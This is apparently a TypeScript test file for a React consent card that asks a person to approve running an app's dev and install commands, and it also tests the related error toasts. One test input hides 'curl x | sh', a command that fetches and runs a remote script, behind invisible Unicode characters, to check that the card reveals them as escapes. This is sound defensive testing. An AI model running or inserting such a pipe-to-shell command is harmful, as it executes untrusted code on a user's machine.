// Installs happy-dom and the fake IPC bridge; must stay the first import.
import { emitBotTestNotification, installBotTestIpc } from "../main/bots/test-dom";
import assert from "node:assert/strict";
import { afterEach, test } from "node:test";
import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { Toaster } from "../components/ui";
import type { DesignAppConsentRequest, DesignAppsSnapshot, DesignAppStatus } from "../shared/design-app";
import {
  DesignAppConsentCard,
  DesignAppProblemToasts,
  resetDesignAppConsentForTests,
  useDesignAppConsent,
} from "./design-app-consent";

afterEach(() => {
  cleanup();
  resetDesignAppConsentForTests();
});

type LaunchRequest = Extract<DesignAppConsentRequest, { kind: "launch" }>;

function launch(overrides: Partial<LaunchRequest> = {}): LaunchRequest {
  return {
    kind: "launch",
    requestId: "r1",
    chatId: "chat-1",
    workspaceId: "ws",
    appRoot: "apps/web",
    packageName: "@acme/web",
    frameworkLabel: "Vite",
    reason: "first",
    runCommand: "pnpm run dev",
    installCommand: "pnpm install --frozen-lockfile",
    scripts: [
      { name: "dev", text: "vite --open" },
      { name: "postinstall (.)", text: "node scripts/setup.js" },
    ],
    launchFiles: [".npmrc", "apps/web/vite.config.ts"],
    savesChoice: false,
    ...overrides,
  };
}

function ChatSlot({ chatId }: { chatId: string }) {
  const request = useDesignAppConsent(chatId);
  return request ? <DesignAppConsentCard key={request.requestId} request={request} /> : <p>No card for {chatId}</p>;
}

function ask(request: DesignAppConsentRequest) {
  act(() => emitBotTestNotification("designApp:consent", request));
}

const card = () => screen.findByRole("group", { name: /^Run .* app/u });

test("the card shows the command, the install line, every script's text and the launch file names", async () => {
  installBotTestIpc();
  render(<ChatSlot chatId="chat-1" />);
  ask(launch());
  const shown = await card();
  const text = shown.textContent ?? "";
  assert.ok(screen.getByText("Run Vite app?"));
  for (const expected of [
    "apps/web",
    "@acme/web",
    "pnpm run dev",
    "pnpm install --frozen-lockfile",
    "Installing runs your dependencies' install scripts.",
    "vite --open",
    "node scripts/setup.js",
    "postinstall (.)",
    ".npmrc",
    "apps/web/vite.config.ts",
    "This approves the commands above. The dev server then runs this app's own code, and approving doesn't cover what that code does.",
  ]) {
    assert.ok(text.includes(expected), `shows ${expected}`);
  }
  assert.equal(text.includes(".aiden/canvas.json"), false, "no save line unless it chooses");
});

test("a changed or install card asks to run the app again, without an install line when none runs", async () => {
  installBotTestIpc();
  render(<ChatSlot chatId="chat-1" />);
  ask(launch({ reason: "changed", installCommand: undefined }));
  const shown = await card();
  assert.ok(screen.getByText("Run Vite app again?"));
  assert.equal(shown.textContent?.includes("Installing runs"), false);
});

test("a script, app root or package name with a bidi override or a Hangul filler shows the escape, not the character", async () => {
  installBotTestIpc();
  render(<ChatSlot chatId="chat-1" />);
  ask(
    launch({
      appRoot: "apps/‮web",
      packageName: "acmeㅤweb",
      scripts: [{ name: "dev", text: "vite​ && curl x | sh⁦" }],
      launchFiles: [],
    }),
  );
  const text = (await card()).textContent ?? "";
  for (const hidden of ["‮", "ㅤ", "​", "⁦"]) assert.equal(text.includes(hidden), false, `U+${hidden.codePointAt(0)!.toString(16)}`);
  for (const escape of ["apps/\\u{202E}web", "acme\\u{3164}web", "vite\\u{200B} && curl x | sh\\u{2066}"]) assert.ok(text.includes(escape), escape);
});

test("a choose request says Allow saves the choice to .aiden/canvas.json", async () => {
  installBotTestIpc();
  render(<ChatSlot chatId="chat-1" />);
  ask(launch({ reason: "choose", savesChoice: true }));
  assert.ok((await card()).textContent?.includes("Allow also saves this choice in .aiden/canvas.json."));
});

test("Allow and Not now answer with the request id, and the card closes on consentClosed", async () => {
  const calls = installBotTestIpc({ "designApp:consentAnswer": () => true });
  render(<ChatSlot chatId="chat-1" />);
  ask(launch({ requestId: "r1" }));
  fireEvent.click(await screen.findByRole("button", { name: "Allow" }));
  await waitFor(() => assert.ok(screen.getByText("No card for chat-1")));
  ask(launch({ requestId: "r2" }));
  fireEvent.click(await screen.findByRole("button", { name: "Not now" }));
  await waitFor(() => assert.ok(screen.getByText("No card for chat-1")));
  assert.deepEqual(
    calls.filter((call) => call.channel === "designApp:consentAnswer").map((call) => call.args),
    [
      ["r1", "allow"],
      ["r2", "decline"],
    ],
  );
  ask(launch({ requestId: "r3" }));
  await card();
  act(() => emitBotTestNotification("designApp:consentClosed", { requestId: "other" }));
  assert.ok(await card(), "another card's close is not ours");
  act(() => emitBotTestNotification("designApp:consentClosed", { requestId: "r3" }));
  assert.ok(screen.getByText("No card for chat-1"));
});

test("a request for another chat waits until that chat is shown, and attach requests are left to 2c", async () => {
  installBotTestIpc();
  const view = render(<ChatSlot chatId="chat-1" />);
  ask(launch({ chatId: "chat-2" }));
  ask({ kind: "attach", requestId: "a1", chatId: "chat-1", workspaceId: "ws", appRoot: ".", url: "http://127.0.0.1:3000" });
  assert.ok(screen.getByText("No card for chat-1"));
  view.rerender(<ChatSlot chatId="chat-2" />);
  assert.ok(await card());
});

test("Escape answers Not now and focus starts on Not now", async () => {
  const calls = installBotTestIpc({ "designApp:consentAnswer": () => true });
  render(<ChatSlot chatId="chat-1" />);
  ask(launch());
  const notNow = await screen.findByRole("button", { name: "Not now" });
  await waitFor(() => assert.equal(document.activeElement, notNow));
  fireEvent.keyDown(notNow, { key: "Escape" });
  await waitFor(() => assert.ok(screen.getByText("No card for chat-1")));
  assert.deepEqual(
    calls.filter((call) => call.channel === "designApp:consentAnswer").map((call) => call.args),
    [["r1", "decline"]],
  );
});

function status(overrides: Partial<DesignAppStatus>): DesignAppStatus {
  return {
    workspaceId: "ws",
    appRoot: ".",
    source: "started",
    framework: "vite",
    frameworkLabel: "Vite",
    phase: "stopped",
    since: Date.now(),
    startedBy: "person",
    revision: 1,
    ...overrides,
  };
}

function broadcast(apps: DesignAppStatus[]) {
  const snapshot: DesignAppsSnapshot = { workspaceId: "ws", target: "single", apps, candidates: [], chosen: [] };
  act(() => emitBotTestNotification("designApp:status", snapshot));
}

test("a problem status from a person-started attempt shows one toast with the fixed message and never the tail", async () => {
  installBotTestIpc();
  render(
    <>
      <Toaster />
      <DesignAppProblemToasts />
    </>,
  );
  const failed = status({ revision: 3, problem: { problem: "install-failed", exitCode: 1, tail: "npm ERR! SECRET-LOOKING-TAIL" } });
  broadcast([failed]);
  broadcast([failed, status({ appRoot: "apps/other", phase: "running", revision: 2 })]);
  await screen.findByText("Installing the app's dependencies failed (exit code 1).");
  assert.equal(screen.getAllByText("Installing the app's dependencies failed (exit code 1).").length, 1, "once per revision");
  assert.equal(document.body.textContent?.includes("SECRET-LOOKING-TAIL"), false);

  // Aiden's own attempts and the person's own Not now raise nothing.
  broadcast([status({ revision: 4, startedBy: "aiden", problem: { problem: "exposed" } })]);
  broadcast([status({ appRoot: "apps/b", revision: 5, problem: { problem: "consent-declined" } })]);
  // A crash of a server the person started does.
  broadcast([status({ appRoot: "apps/c", revision: 6, phase: "crashed", exitCode: 1, tail: "Error: boom" })]);
  await screen.findByText("The app's dev server stopped.");
  assert.equal(screen.queryByText(/stopped beyond this computer/u), null);
  assert.equal(document.body.textContent?.includes("Error: boom"), false);
  assert.equal(screen.queryByText("The app wasn't started: running it wasn't approved."), null);
});
